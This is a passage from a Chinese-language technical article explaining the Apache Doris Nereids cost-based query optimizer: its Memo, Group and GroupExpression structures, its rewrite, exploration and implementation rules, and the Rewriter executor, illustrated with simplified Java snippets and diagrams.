<li>自动探索搜索空间</li>
</ul>
</li>
<li>
<p><strong>代价驱动（Cost-Based）</strong>：</p>
<ul>
<li>为每个物理计划估算代价</li>
<li>基于统计信息选择最优计划</li>
<li>动态规划寻找全局最优</li>
</ul>
</li>
</ol>
<h3 data-id="heading-7">1.3 Nereids 架构组件</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[SQL] --&gt; B[Parser解析]
    B --&gt; C[LogicalPlan逻辑计划]
    C --&gt; D[Analyzer分析]
    D --&gt; E[Rewriter重写]
    E --&gt; F[Optimizer优化]
    F --&gt; G[PhysicalPlan物理计划]
    G --&gt; H[PostProcessor后处理]
    H --&gt; I[分布式计划]
    
    D --&gt; D1[类型推导]
    D --&gt; D2[名称解析]
    
    E --&gt; E1[谓词下推]
    E --&gt; E2[列裁剪]
    E --&gt; E3[常量折叠]
    
    F --&gt; F1[Join顺序]
    F --&gt; F2[物理算子选择]
    F --&gt; F3[代价估算]
</code></pre>
<p><strong>核心组件</strong>：</p>


















































<table><thead><tr><th>组件</th><th>职责</th><th>关键类</th></tr></thead><tbody><tr><td><strong>CascadesContext</strong></td><td>优化上下文</td><td><code>CascadesContext.java</code></td></tr><tr><td><strong>Memo</strong></td><td>存储等价表达式</td><td><code>Memo.java</code></td></tr><tr><td><strong>Group</strong></td><td>逻辑等价的表达式集合</td><td><code>Group.java</code></td></tr><tr><td><strong>GroupExpression</strong></td><td>具体的表达式实现</td><td><code>GroupExpression.java</code></td></tr><tr><td><strong>Rewriter</strong></td><td>逻辑重写</td><td><code>Rewriter.java</code></td></tr><tr><td><strong>Optimizer</strong></td><td>CBO 优化</td><td><code>Optimizer.java</code></td></tr><tr><td><strong>CostCalculator</strong></td><td>代价计算</td><td><code>CostCalculator.java</code></td></tr><tr><td><strong>Statistics</strong></td><td>统计信息</td><td><code>Statistics.java</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-8">2. Memo 数据结构详解（How）</h2>
<h3 data-id="heading-9">2.1 Memo 核心设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/memo/Memo.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Memo</span> {
    <span class="hljs-comment">// Group ID 生成器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> IdGenerator&lt;GroupId&gt; groupIdGenerator = GroupId.createGenerator();
    
    <span class="hljs-comment">// 所有 Group 的集合</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;GroupId, Group&gt; groups = Maps.newLinkedHashMap();
    
    <span class="hljs-comment">// 所有 GroupExpression 的集合（用于去重）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;GroupExpression, GroupExpression&gt; groupExpressions = Maps.newHashMap();
    
    <span class="hljs-comment">// 根 Group</span>
    <span class="hljs-keyword">private</span> Group root;
    
    <span class="hljs-comment">/**
     * 将 Plan 添加到 Memo 中
     */</span>
    <span class="hljs-keyword">public</span> CopyInResult <span class="hljs-title function_">copyIn</span><span class="hljs-params">(Plan plan, <span class="hljs-meta">@Nullable</span> Group target, <span class="hljs-type">boolean</span> rewrite)</span> {
        CopyInResult result;
        <span class="hljs-keyword">if</span> (rewrite) {
            result = doRewrite(plan, target);
        } <span class="hljs-keyword">else</span> {
            result = doCopyIn(plan, target, <span class="hljs-literal">null</span>);
        }
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<p><strong>设计要点</strong>：</p>
<ol>
<li>
<p><strong>紧凑存储</strong>：</p>
<ul>
<li>所有等价表达式存储在同一个 Group 中</li>
<li>避免重复存储相同结构的计划</li>
<li>通过 groupExpressions Map 快速去重</li>
</ul>
</li>
<li>
<p><strong>引用共享</strong>：</p>
<ul>
<li>子计划通过 Group 引用</li>
<li>多个 GroupExpression 可以共享子 Group</li>
<li>减少内存占用</li>
</ul>
</li>
<li>
<p><strong>版本控制</strong>：</p>
<ul>
<li>refreshVersion 跟踪 Memo 的变化</li>
<li>用于统计信息的增量更新</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">2.2 Group 设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/memo/Group.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Group</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> GroupId groupId;
    
    <span class="hljs-comment">// 逻辑表达式列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;GroupExpression&gt; logicalExpressions = Lists.newArrayList();
    
    <span class="hljs-comment">// 物理表达式列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;GroupExpression&gt; physicalExpressions = Lists.newArrayList();
    
    <span class="hljs-comment">// 逻辑属性（输出列、数据分布等）</span>
    <span class="hljs-keyword">private</span> LogicalProperties logicalProperties;
    
    <span class="hljs-comment">// 最优计划缓存：PhysicalProperties -&gt; (Cost, GroupExpression)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;PhysicalProperties, Pair&lt;Cost, GroupExpression&gt;&gt; lowestCostPlans
        = Maps.newLinkedHashMap();
    
    <span class="hljs-comment">// 统计信息</span>
    <span class="hljs-keyword">private</span> Statistics statistics;
    
    <span class="hljs-comment">/**
     * 添加 GroupExpression
     */</span>
    <span class="hljs-keyword">public</span> GroupExpression <span class="hljs-title function_">addGroupExpression</span><span class="hljs-params">(GroupExpression groupExpression)</span> {
        <span class="hljs-keyword">if</span> (groupExpression.getPlan() <span class="hljs-keyword">instanceof</span> LogicalPlan) {
            logicalExpressions.add(groupExpression);
        } <span class="hljs-keyword">else</span> {
            physicalExpressions.add(groupExpression);
        }
        groupExpression.setOwnerGroup(<span class="hljs-built_in">this</span>);
        <span class="hljs-keyword">return</span> groupExpression;
    }
    
    <span class="hljs-comment">/**
     * 设置最优计划
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBestPlan</span><span class="hljs-params">(GroupExpression expression, Cost cost, 
                           PhysicalProperties properties)</span> {
        <span class="hljs-keyword">if</span> (lowestCostPlans.containsKey(properties)) {
            <span class="hljs-keyword">if</span> (lowestCostPlans.get(properties).first.getValue() &gt; cost.getValue()) {
                lowestCostPlans.put(properties, Pair.of(cost, expression));
            }
        } <span class="hljs-keyword">else</span> {
            lowestCostPlans.put(properties, Pair.of(cost, expression));
        }
    }
}
</code></pre>
<p><strong>Group 的关键属性</strong>：</p>
<ol>
<li>
<p><strong>逻辑等价性</strong>：</p>
<ul>
<li>同一 Group 中的所有 LogicalExpression 逻辑等价</li>
<li>产生相同的输出数据</li>
<li>具有相同的 LogicalProperties</li>
</ul>
</li>
<li>
<p><strong>多种物理实现</strong>：</p>
<ul>
<li>一个逻辑计划可以有多种物理实现</li>
<li>例如：LogicalJoin -&gt; HashJoin / NestLoopJoin</li>
</ul>
</li>
<li>
<p><strong>最优计划缓存</strong>：</p>
<ul>
<li>针对不同的物理属性需求（排序、分布）</li>
<li>缓存对应的最优计划和代价</li>
<li>避免重复计算</li>
</ul>
</li>
</ol>
<h3 data-id="heading-11">2.3 GroupExpression 设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/memo/GroupExpression.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GroupExpression</span> {
    <span class="hljs-keyword">private</span> Group ownerGroup;          <span class="hljs-comment">// 所属 Group</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;Group&gt; children; <span class="hljs-comment">// 子 Group 列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Plan plan;           <span class="hljs-comment">// 对应的 Plan 节点</span>
    
    <span class="hljs-comment">// 规则应用标记（避免重复应用）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> BitSet ruleMasks;
    
    <span class="hljs-comment">// 统计信息是否已推导</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> statDerived;
    
    <span class="hljs-comment">// 最优代价表：OutputProperties -&gt; (Cost, ChildrenInputProperties)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;PhysicalProperties, Pair&lt;Cost, List&lt;PhysicalProperties&gt;&gt;&gt; 
        lowestCostTable;
    
    <span class="hljs-comment">// 请求属性映射：RequestProperties -&gt; OutputProperties</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;PhysicalProperties, PhysicalProperties&gt; requestPropertiesMap;
    
    <span class="hljs-comment">/**
     * 更新最优代价表
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">updateLowestCostTable</span><span class="hljs-params">(PhysicalProperties outputProperties,
            List&lt;PhysicalProperties&gt; childrenInputProperties, Cost cost)</span> {
        <span class="hljs-keyword">if</span> (lowestCostTable.containsKey(outputProperties)) {
            <span class="hljs-keyword">if</span> (lowestCostTable.get(outputProperties).first.getValue() &gt; cost.getValue()) {
                lowestCostTable.put(outputProperties, Pair.of(cost, childrenInputProperties));
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
        } <span class="hljs-keyword">else</span> {
            lowestCostTable.put(outputProperties, Pair.of(cost, childrenInputProperties));
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }
    
    <span class="hljs-comment">/**
     * 检查规则是否已应用
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasApplied</span><span class="hljs-params">(Rule rule)</span> {
        <span class="hljs-keyword">return</span> ruleMasks.get(rule.getRuleType().ordinal());
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApplied</span><span class="hljs-params">(Rule rule)</span> {
        ruleMasks.set(rule.getRuleType().ordinal());
    }
}
</code></pre>
<p><strong>GroupExpression 的作用</strong>：</p>
<ol>
<li>
<p><strong>连接 Plan 和 Group</strong>：</p>
<ul>
<li>Plan：具体的算子（如 HashJoin）</li>
<li>Children：子 Group 列表（不是具体 Plan）</li>
<li>共享子表达式</li>
</ul>
</li>
<li>
<p><strong>代价计算</strong>：</p>
<ul>
<li>lowestCostTable：针对不同输出属性的最优代价</li>
<li>childrenInputProperties：对子节点的属性要求</li>
<li>支持动态规划的代价累加</li>
</ul>
</li>
<li>
<p><strong>规则应用追踪</strong>：</p>
<ul>
<li>ruleMasks：记录已应用的规则</li>
<li>避免重复应用相同规则</li>
<li>防止无限递归</li>
</ul>
</li>
</ol>
<h3 data-id="heading-12">2.4 Memo 示例</h3>
<p><strong>查询</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t1 <span class="hljs-keyword">JOIN</span> t2 <span class="hljs-keyword">ON</span> t1.id <span class="hljs-operator">=</span> t2.id <span class="hljs-keyword">WHERE</span> t1.value <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span>;
</code></pre>
<p><strong>Memo 结构</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Group 0:</span> <span class="hljs-string">(Root)</span>
  <span class="hljs-string">├─</span> <span class="hljs-attr">LogicalExpression 0:</span> <span class="hljs-string">LogicalJoin</span>
  <span class="hljs-string">│</span>   <span class="hljs-string">├─</span> <span class="hljs-string">child[0]</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">Group</span> <span class="hljs-number">1</span>
  <span class="hljs-string">│</span>   <span class="hljs-string">└─</span> <span class="hljs-string">child[1]</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">Group</span> <span class="hljs-number">2</span>
  <span class="hljs-string">├─</span> <span class="hljs-attr">PhysicalExpression 0:</span> <span class="hljs-string">HashJoin</span> <span class="hljs-string">(Build:</span> <span class="hljs-string">Group</span> <span class="hljs-number">2</span><span class="hljs-string">,</span> <span class="hljs-attr">Probe:</span> <span class="hljs-string">Group</span> <span class="hljs-number">1</span><span class="hljs-string">)</span>
  <span class="hljs-string">└─</span> <span class="hljs-attr">PhysicalExpression 1:</span> <span class="hljs-string">NestLoopJoin</span>

<span class="hljs-attr">Group 1:</span> <span class="hljs-string">(t1</span> <span class="hljs-string">after</span> <span class="hljs-string">filter)</span>
  <span class="hljs-string">├─</span> <span class="hljs-attr">LogicalExpression 0:</span> <span class="hljs-string">LogicalFilter</span>
  <span class="hljs-string">│</span>   <span class="hljs-string">└─</span> <span class="hljs-string">child[0]</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">Group</span> <span class="hljs-number">3</span>
  <span class="hljs-string">└─</span> <span class="hljs-attr">PhysicalExpression 0:</span> <span class="hljs-string">PhysicalFilter</span>
      <span class="hljs-string">└─</span> <span class="hljs-string">child[0]</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">Group</span> <span class="hljs-number">3</span> <span class="hljs-string">(PhysicalOlapScan)</span>

<span class="hljs-attr">Group 2:</span> <span class="hljs-string">(t2</span> <span class="hljs-string">scan)</span>
  <span class="hljs-string">├─</span> <span class="hljs-attr">LogicalExpression 0:</span> <span class="hljs-string">LogicalOlapScan(t2)</span>
  <span class="hljs-string">└─</span> <span class="hljs-attr">PhysicalExpression 0:</span> <span class="hljs-string">PhysicalOlapScan(t2)</span>

<span class="hljs-attr">Group 3:</span> <span class="hljs-string">(t1</span> <span class="hljs-string">scan)</span>
  <span class="hljs-string">├─</span> <span class="hljs-attr">LogicalExpression 0:</span> <span class="hljs-string">LogicalOlapScan(t1)</span>
  <span class="hljs-string">└─</span> <span class="hljs-attr">PhysicalExpression 0:</span> <span class="hljs-string">PhysicalOlapScan(t1)</span>
</code></pre>
<p><strong>等价计划展开</strong>：</p>
<p>通过 Memo 可以生成多种等价计划：</p>
<pre><code class="hljs language-css" lang="css">计划 <span class="hljs-number">1</span>: <span class="hljs-built_in">HashJoin</span>(<span class="hljs-built_in">PhysicalFilter</span>(<span class="hljs-built_in">PhysicalOlapScan</span>(t1)), <span class="hljs-built_in">PhysicalOlapScan</span>(t2))
计划 <span class="hljs-number">2</span>: <span class="hljs-built_in">NestLoopJoin</span>(<span class="hljs-built_in">PhysicalFilter</span>(<span class="hljs-built_in">PhysicalOlapScan</span>(t1)), <span class="hljs-built_in">PhysicalOlapScan</span>(t2))
计划 <span class="hljs-number">3</span>: <span class="hljs-built_in">HashJoin</span>(<span class="hljs-built_in">PhysicalOlapScan</span>(t1) + Filter下推, <span class="hljs-built_in">PhysicalOlapScan</span>(t2))
...
</code></pre>
<hr/>
<h2 data-id="heading-13">3. 优化规则系统（How）</h2>
<h3 data-id="heading-14">3.1 规则分类</h3>
<p><strong>Nereids 中的三类规则</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[优化规则] --&gt; B[Rewrite 重写规则]
    A --&gt; C[Exploration 探索规则]
    A --&gt; D[Implementation 实现规则]
    
    B --&gt; B1[谓词下推]
    B --&gt; B2[列裁剪]
    B --&gt; B3[常量折叠]
    B --&gt; B4[子查询Unnesting]
    
    C --&gt; C1[Join交换]
    C --&gt; C2[Join结合]
    C --&gt; C3[聚合下推]
    C --&gt; C4[物化视图改写]
    
    D --&gt; D1[逻辑-&gt;HashJoin]
    D --&gt; D2[逻辑-&gt;NestLoopJoin]
    D --&gt; D3[逻辑-&gt;StreamAgg]
    D --&gt; D4[逻辑-&gt;HashAgg]
</code></pre>
<h4 data-id="heading-15">3.1.1 Rewrite 规则（逻辑重写）</h4>
<p><strong>作用</strong>：</p>
<ul>
<li>在逻辑层面转换计划</li>
<li>不改变逻辑语义，但可能提高性能</li>
<li>在 Memo 初始化之前执行</li>
</ul>
<p><strong>常见规则</strong>：</p>
<ol>
<li>
<p><strong>谓词下推（Predicate Pushdown）</strong>：</p>
<ul>
<li><code>PushDownFilterThroughProject</code></li>
<li><code>PushDownFilterThroughJoin</code></li>
<li><code>PushDownFilterThroughAggregation</code></li>
</ul>
</li>
<li>
<p><strong>列裁剪（Column Pruning）</strong>：</p>
<ul>
<li><code>ColumnPruning</code></li>
<li>移除未使用的输出列</li>
</ul>
</li>
<li>
<p><strong>常量折叠（Constant Folding）</strong>：</p>
<ul>
<li><code>FoldConstantRule</code></li>
<li><code>SimplifyArithmeticRule</code></li>
</ul>
</li>
<li>
<p><strong>子查询去关联（Subquery Decorrelation）</strong>：</p>
<ul>
<li><code>CorrelateApplyToUnCorrelateApply</code></li>
<li><code>ApplyToJoin</code></li>
</ul>
</li>
</ol>
<p><strong>示例：谓词下推</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PushDownFilterThroughProject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OneRewriteRuleFactory</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Rule <span class="hljs-title function_">build</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> logicalFilter(logicalProject()).then(filter -&gt; {
            LogicalProject&lt;Plan&gt; project = filter.child();
            
            <span class="hljs-comment">// 将 Filter 中的表达式替换为 Project 下方的引用</span>
            Set&lt;Expr&gt; newPredicates = replaceExpression(
                filter.getConjuncts(), 
                project.getProjects()
            );
            
            <span class="hljs-comment">// 构造新的计划：Project(Filter(...))</span>
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalProject</span>&lt;&gt;(
                project.getProjects(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalFilter</span>&lt;&gt;(newPredicates, project.child())
            );
        });
    }
}
</code></pre>
<h4 data-id="heading-16">3.1.2 Exploration 规则（探索规则）</h4>
<p><strong>作用</strong>：</p>
<ul>
<li>生成逻辑等价的不同计划</li>
<li>扩展搜索空间</li>
<li>在 Optimizer 阶段执行</li>
</ul>
<p><strong>常见规则</strong>：</p>
<ol>
<li>
<p><strong>Join 交换律（Join Commute）</strong>：</p>
<ul>
<li><code>t1 JOIN t2</code> -&gt; <code>t2 JOIN t1</code></li>
<li>改变 Join 顺序</li>
</ul>
</li>
<li>
<p><strong>Join 结合律（Join Associate）</strong>：</p>
<ul>
<li><code>(t1 JOIN t2) JOIN t3</code> -&gt; <code>t1 JOIN (t2 JOIN t3)</code></li>
<li>生成 Bushy Tree</li>
</ul>
</li>
<li>
<p><strong>聚合下推（Aggregate Pushdown）</strong>：</p>
<ul>
<li><code>PushDownAggThroughJoin</code></li>
<li>利用 Group By 列的唯一性</li>
</ul>
</li>
</ol>
<p><strong>示例：Join 交换</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JoinCommute</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OneExplorationRuleFactory</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Rule <span class="hljs-title function_">build</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> innerLogicalJoin().when(join -&gt; {
            <span class="hljs-comment">// 只对 Inner Join 应用交换律</span>
            <span class="hljs-keyword">return</span> join.getJoinType() == JoinType.INNER_JOIN;
        }).then(join -&gt; {
            <span class="hljs-comment">// 交换左右子树</span>
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalJoin</span>&lt;&gt;(
                join.getJoinType(),
                swapHashJoinConjuncts(join.getHashJoinConjuncts()),
                join.getOtherJoinConjuncts(),
                join.right(),  <span class="hljs-comment">// 交换</span>
                join.left()    <span class="hljs-comment">// 交换</span>
            );
        });
    }
}
</code></pre>
<h4 data-id="heading-17">3.1.3 Implementation 规则（实现规则）</h4>
<p><strong>作用</strong>：</p>
<ul>
<li>将逻辑计划转换为物理计划</li>
<li>生成可执行的算子</li>
<li>在 Optimizer 阶段执行</li>
</ul>
<p><strong>常见规则</strong>：</p>
<ol>
<li>
<p><strong>Join 实现</strong>：</p>
<ul>
<li><code>LogicalJoin -&gt; PhysicalHashJoin</code></li>
<li><code>LogicalJoin -&gt; PhysicalNestLoopJoin</code></li>
</ul>
</li>
<li>
<p><strong>聚合实现</strong>：</p>
<ul>
<li><code>LogicalAggregate -&gt; PhysicalHashAggregate</code></li>
<li><code>LogicalAggregate -&gt; PhysicalStreamAggregate</code></li>
</ul>
</li>
<li>
<p><strong>扫描实现</strong>：</p>
<ul>
<li><code>LogicalOlapScan -&gt; PhysicalOlapScan</code></li>
</ul>
</li>
</ol>
<p><strong>示例：HashJoin 实现</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogicalJoinToPhysicalHashJoin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OneImplementationRuleFactory</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Rule <span class="hljs-title function_">build</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> logicalJoin().then(join -&gt; {
            <span class="hljs-comment">// 选择左表为 Probe，右表为 Build</span>
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PhysicalHashJoin</span>&lt;&gt;(
                join.getJoinType(),
                join.getHashJoinConjuncts(),
                join.getOtherJoinConjuncts(),
                join.left(),   <span class="hljs-comment">// Probe 端</span>
                join.right(),  <span class="hljs-comment">// Build 端</span>
                JoinHint.NONE
            );
        });
    }
}
</code></pre>
<h3 data-id="heading-18">3.2 规则执行框架</h3>
<h4 data-id="heading-19">3.2.1 Rule 抽象基类</h4>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/rules/Rule.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rule</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RuleType ruleType;               <span class="hljs-comment">// 规则类型</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Pattern&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Plan</span>&gt; pattern; <span class="hljs-comment">// 匹配模式</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RulePromise rulePromise;         <span class="hljs-comment">// 规则优先级</span>
    
    <span class="hljs-comment">/**
     * 应用规则
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> List&lt;Plan&gt; <span class="hljs-title function_">transform</span><span class="hljs-params">(Plan node, CascadesContext context)</span>;
    
    <span class="hljs-comment">/**
     * 检查规则是否无效
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isInvalid</span><span class="hljs-params">(BitSet disableRules, GroupExpression groupExpression)</span> {
        <span class="hljs-keyword">return</span> disableRules.get(<span class="hljs-built_in">this</span>.getRuleType().type())
                || !groupExpression.notApplied(<span class="hljs-built_in">this</span>)
                || !<span class="hljs-built_in">this</span>.getPattern().matchRoot(groupExpression.getPlan());
    }
}
</code></pre>
<p><strong>关键设计</strong>：</p>
<ol>
<li>
<p><strong>模式匹配（Pattern）</strong>：</p>
<ul>
<li>声明式定义规则适用的计划结构</li>
<li>支持通配符和类型匹配</li>
<li>高效的计划筛选</li>
</ul>
</li>
<li>
<p><strong>规则优先级（RulePromise）</strong>：</p>
<ul>
<li>ALWAYS：总是有益（如谓词下推）</li>
<li>HEURISTIC：启发式有益</li>
<li>COST_BASED：需要代价比较</li>
</ul>
</li>
<li>
<p><strong>应用追踪</strong>：</p>
<ul>
<li>记录已应用的规则</li>
<li>避免重复应用同一规则</li>
<li>防止无限递归</li>
</ul>
</li>
</ol>
<h4 data-id="heading-20">3.2.2 Rewriter 执行器</h4>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/jobs/executor/Rewriter.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rewriter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractBatchJobExecutor</span> {
    
    <span class="hljs-comment">// Rewrite 作业列表（300+ 规则）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;RewriteJob&gt; DEFAULT_REWRITE_JOBS = jobs(
        
        <span class="hljs-comment">// 第一阶段：计划标准化</span>
        topic(<span class="hljs-string">"Plan Normalization"</span>,
            topDown(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">EliminateOrderByConstant</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalSubQueryAliasToLogicalProject</span>(),
                ExpressionNormalizationAndOptimization.FULL_RULE_INSTANCE,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExtractFilterFromCrossJoin</span>()
            )
        ),
        
        <span class="hljs-comment">// 第二阶段：子查询去关联</span>
        topic(<span class="hljs-string">"Subquery unnesting"</span>,
            bottomUp(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PullUpProjectUnderApply</span>()),
            topDown(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PushDownFilterThroughProject</span>()),
            custom(RuleType.AGG_SCALAR_SUBQUERY_TO_WINDOW_FUNCTION,
                AggScalarSubQueryToWindowFunction::<span class="hljs-keyword">new</span>),
            bottomUp(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelateApplyToUnCorrelateApply</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplyToJoin</span>()
            )
        ),
        
        <span class="hljs-comment">// 第三阶段：列裁剪和谓词下推</span>
        topic(<span class="hljs-string">"Column pruning and predicate pushdown"</span>,
            custom(RuleType.COLUMN_PRUNING, ColumnPruning::<span class="hljs-keyword">new</span>),
            bottomUp(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">PushDownFilterThroughProject</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">PushDownFilterThroughJoin</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">MergeFilters</span>()
            )
        ),
        
        <span class="hljs-comment">// 第四阶段：消除优化</span>
        topic(<span class="hljs-string">"Eliminate optimization"</span>,
            bottomUp(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">EliminateLimit</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">EliminateFilter</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">EliminateJoinCondition</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">EliminateSemiJoin</span>()
            )
        )
        
        <span class="hljs-comment">// ... 更多阶段</span>
    );
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 执行所有 Rewrite 作业</span>
        <span class="hljs-keyword">for</span> (RewriteJob job : DEFAULT_REWRITE_JOBS) {
            job.execute(cascadesContext);
        }
    }
}
</code></pre>
<p><strong>Rewrite 阶段特点</strong>：</p>
<ol>
<li>
<p><strong>分阶段执行</strong>：</p>
<ul>
<li>每个 topic 是一个优化阶段</li>
<li>不同阶段有不同的优化目标</li>
<li>阶段顺序精心设计</li>
</ul>
</li>
<li>
<p><strong>遍历策略</strong>：</p>
<ul>
<li>topDown：自顶向下遍历</li>
<li>bottomUp：自底向上遍历</li>
<li>custom：自定义遍历</li>
</ul>
</li>
<li>
<p><strong>固定点迭代</strong>：</p>
<ul>
<li>重复执行直到计划不再变化</li>
<li>或达到最大迭代次数</li>
</ul>
</li>
</ol>
<h3 data-id="heading-21">3.3 规则示例：谓词下推</h3>
<p><strong>规则定义</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PushDownFilterThroughJoin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OneRewriteRuleFactory</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Rule <span class="hljs-title function_">build</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> logicalFilter(
            logicalJoin()
        ).when(filter -&gt; {
            <span class="hljs-comment">// 只处理 Inner Join</span>
            LogicalJoin&lt;?, ?&gt; join = filter.child();
            <span class="hljs-keyword">return</span> join.getJoinType() == JoinType.INNER_JOIN;
        }).then(filter -&gt; {
            LogicalJoin&lt;Plan, Plan&gt; join = filter.child();
            
            <span class="hljs-comment">// 分离谓词</span>
            Set&lt;Expr&gt; leftOnly = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
            Set&lt;Expr&gt; rightOnly = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
            Set&lt;Expr&gt; both = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
            
            <span class="hljs-keyword">for</span> (Expr predicate : filter.getConjuncts()) {
                Set&lt;SlotReference&gt; slots = predicate.getInputSlots();
                <span class="hljs-type">boolean</span> <span class="hljs-variable">leftInput</span> <span class="hljs-operator">=</span> join.left().getOutputSet().containsAll(slots);
